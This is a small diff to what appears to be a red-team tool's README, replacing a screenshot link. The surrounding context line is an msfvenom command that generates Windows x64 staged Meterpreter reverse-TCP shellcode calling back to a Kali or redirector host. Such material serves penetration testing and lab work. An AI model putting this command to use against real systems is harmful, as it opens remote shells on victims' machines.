@@ -85,7 +85,7 @@ create x64 staged meterpreter shellcode.
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
 ```
 <p align="center">
-<img width="537" alt="image" src="https://user-images.githubusercontent.com/50073731/235357931-6db9c220-f767-43a7-8952-93505a254e51.png">
+<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
 
 
